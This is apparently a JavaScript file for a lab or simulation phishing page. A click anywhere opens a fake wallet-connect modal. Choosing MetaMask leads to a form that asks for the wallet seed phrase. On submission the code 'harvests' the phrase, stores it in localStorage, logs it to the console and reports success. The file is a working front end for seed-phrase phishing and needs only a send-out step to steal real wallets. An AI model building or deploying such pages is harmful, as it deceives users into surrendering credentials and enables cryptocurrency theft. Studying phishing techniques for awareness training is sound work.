// Navigation Elements
const walletModal = document.getElementById('walletModal');
const closeModalBtn = document.getElementById('closeModalBtn');

// View Steps
const stepSelectWallet = document.getElementById('stepSelectWallet');
const stepHarvest = document.getElementById('stepHarvest');

// Action Trigger Elements
const selectMetaMaskBtn = document.getElementById('selectMetaMaskBtn');
const harvestForm = document.getElementById('harvestForm');
const seedPhraseInput = document.getElementById('seedPhraseInput');

// Flag to ensure the popup only triggers once automatically
let popupTriggered = false;

// Function to reveal the modal
function triggerPopup() {
  walletModal.classList.remove('hidden');
  stepSelectWallet.classList.remove('hidden');
  stepHarvest.classList.add('hidden');
}

// 1. GLOBAL CLICK TRIGGER: Listen for a click anywhere on the document
document.addEventListener('click', (event) => {
  // If the popup has already been triggered, or if the user is clicking inside the open modal, do nothing
  if (popupTriggered || walletModal.contains(event.target)) {
    return;
  }

  // Mark as triggered so it doesn't repeatedly open on every single click
  popupTriggered = true;
  triggerPopup();
});

// Close Modal manually
closeModalBtn.addEventListener('click', (e) => {
  e.stopPropagation(); // Prevent the click from bubbling up to the document
  walletModal.classList.add('hidden');
});

// Advance to fake seed phrase step when MetaMask option is clicked
selectMetaMaskBtn.addEventListener('click', (e) => {
  e.stopPropagation();
  stepSelectWallet.classList.add('hidden');
  stepHarvest.classList.remove('hidden');
});

// Intercept submission and harvest the data
harvestForm.addEventListener('submit', (e) => {
  e.preventDefault(); 
  
  const harvestedPhrase = seedPhraseInput.value.trim();

  // 2. LOCAL STORAGE LOGGING: Save the data locally in the browser
  // Generating a timestamped key to allow multiple simulation logs
  const logKey = `harvested_phrase_${Date.now()}`;
  localStorage.setItem(logKey, harvestedPhrase);

  // LAB OUTPUT: Console verification
  console.warn("--- DATA CAPTURED & SAVED TO LOCAL STORAGE ---");
  console.log(`Key saved: ${logKey}`);
  console.log(`Value saved: "${harvestedPhrase}"`);
  console.warn("-----------------------------------------------");

  alert("Success!.");
  
  seedPhraseInput.value = "";
  walletModal.classList.add('hidden');
});
